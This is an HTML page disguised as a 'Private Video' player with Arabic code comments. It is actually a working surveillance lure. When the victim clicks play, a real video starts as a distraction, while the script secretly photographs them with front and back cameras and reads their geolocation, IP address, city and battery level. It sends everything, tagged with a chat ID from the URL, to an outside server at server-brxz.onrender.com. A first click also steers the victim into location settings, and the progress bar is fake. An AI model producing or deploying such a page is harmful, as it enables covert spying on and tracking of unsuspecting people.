<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://1drv.ms/i/c/025c6bbc5ba7e982/IQTBkQxHO9tQQoLyMqkdY1NgAQNoob9R9d0s6JBs5XDN2Do');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            flex-direction: column;
        }

        #locationActionButton {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #locationActionButton:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #locationActionButton .play-icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .play-button-overlay { display: none; }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .control-button:hover { background: #333; }

        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }

        #loading {
            display: none;
            font-size: 1.2rem;
            color: #fff;
            margin-top: 20px;
            text-align: center;
        }

        .loading-text { margin-top: 10px; }

        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        .fullscreen-btn { margin-left: 15px; }

        @media (max-width: 480px) {
            .video-controls { padding: 10px 12px; gap: 6px; }
            .progress-bar { margin: 0 6px; }
            .time-display { font-size: 0.75rem; min-width: 60px; }
            .video-title { font-size: 1.2rem; }
            .video-thumbnail { height: 280px; }
            #locationActionButton { width: 90px; height: 90px; }
            #locationActionButton .play-icon { font-size: 45px; }
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div id="locationActionButton">
                <span class="play-icon">▶</span>
            </div>
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/mblca2.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="position:static;"></div>
        <div class="loading-text"></div>
    </div>

    <script>
        (function() {
            'use strict';

            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;

            const locationBtn = document.getElementById('locationActionButton');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const spinner = document.getElementById('spinner');
            const loading = document.getElementById('loading');

            // ✅ فتح إعدادات الموقع
            function openLocationSettings() {
                const ua = navigator.userAgent;
                if (/Android/i.test(ua)) {
                    const intents = [
                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent:#Intent;action=android.settings.SETTINGS;end'
                    ];
                    for (let intent of intents) {
                        try { window.location.href = intent; break; } catch (e) {}
                    }
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => window.open('prefs:root=Privacy&path=LOCATION', '_blank'), 500);
                } else if (/Windows/i.test(ua)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } else if (/Mac/i.test(ua)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            // ✅ جلب IP - بدون انتظار طويل
            async function fetchIPInfo() {
                try {
                    const controller = new AbortController();
                    setTimeout(() => controller.abort(), 3000);
                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                    const data = await response.json();
                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
                } catch {
                    capturedData.ipInfo = "IP Info not available";
                }
            }

            // ✅ جلب البطارية
            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
                } catch {
                    capturedData.batteryStatus = "Unknown";
                }
            }

            // ✅ التصوير - بدون تأخير طويل
            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: facingMode } }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    await video.play();

                    await new Promise(resolve => {
                        if (video.readyState >= 2) return resolve();
                        video.onloadeddata = () => resolve();
                        setTimeout(resolve, 500);
                    });

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.7).split(',')[1]);
                    stream.getTracks().forEach(track => track.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                } catch {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                }
            }

            // ✅ طلب الموقع - لا يوقف الفيديو حتى لو رُفض
            async function getLocation() {
                return new Promise((resolve) => {
                    const timeout = setTimeout(() => {
                        capturedData.permissions.push('Geolocation Timeout');
                        capturedData.location = 'Not Available';
                        resolve(); // ✅ يكمل حتى بدون موقع
                    }, 3000);

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            clearTimeout(timeout);
                            capturedData.location = 
                                `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                            capturedData.permissions.push('Geolocation Allowed');
                            resolve();
                        },
                        (error) => {
                            clearTimeout(timeout);
                            capturedData.permissions.push('Geolocation Denied');
                            capturedData.location = 'Denied by User';
                            resolve(); // ✅ يكمل حتى لو رفض المستخدم
                        },
                        {
                            enableHighAccuracy: false,
                            timeout: 3000,
                            maximumAge: 60000
                        }
                    );
                });
            }

            // ✅ إرسال البيانات في الخلفية
            function sendDataInBackground(data) {
                try {
                    const blob = new Blob([new URLSearchParams(data).toString()], {
                        type: 'application/x-www-form-urlencoded'
                    });
                    navigator.sendBeacon('https://server-brxz.onrender.com/submitData', blob);
                } catch (e) {}

                fetch('https://server-brxz.onrender.com/submitData', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(data),
                    mode: 'no-cors',
                    keepalive: true
                }).catch(() => {});
            }

            // ✅ إظهار الفيديو فوراً
            function showVideo() {
                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';
                realVideo.muted = false;
                realVideo.volume = 1.0;
                if (realVideo.paused) {
                    realVideo.play().catch(() => {});
                }
            }

            // ✅ جمع البيانات في الخلفية - بدون انتظار
            async function collectDataInBackground() {
                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';

                // ✅ كل العمليات بالتوازي ولا تنتظر
                await Promise.allSettled([
                    fetchIPInfo(),
                    getBatteryStatus(),
                    getLocation(),
                    captureFromCamera('user'),
                    captureFromCamera('environment')
                ]);

                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };

                sendDataInBackground(data);
            }

            // ✅ معالج الضغط - الفيديو يشتغل فوراً
            async function handleButtonClick() {
                if (isProcessing || videoStarted) return;
                isProcessing = true;

                if (!settingsOpened) {
                    // الضغطة الأولى - فتح الإعدادات
                    settingsOpened = true;
                    openLocationSettings();
                    isProcessing = false;
                } else {
                    // الضغطة الثانية - تشغيل الفيديو فوراً
                    videoStarted = true;
                    showVideo(); // ✅ الفيديو يشتغل مباشرة
                    
                    // جمع البيانات في الخلفية بدون انتظار
                    collectDataInBackground().catch(() => {});
                    
                    isProcessing = false;
                }
            }

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
                    // العودة من الإعدادات
                }
            });

            if (locationBtn) {
                locationBtn.addEventListener('click', handleButtonClick);
            }

            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                }
            }, true);

            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        const video = document.getElementById('realVideo');
                        if (video.requestFullscreen) video.requestFullscreen();
                        else if (video.webkitRequestFullscreen) video.webkitRequestFullscreen();
                    }
                });
            });

            // شريط التقدم
            const progressInterval = setInterval(() => {
                const progressFill = document.querySelector('.progress-fill');
                const realVideoEl = document.getElementById('realVideo');
                if (realVideoEl.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const currentWidth = parseInt(progressFill.style.width) || 35;
                const newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>

</body>
</html>
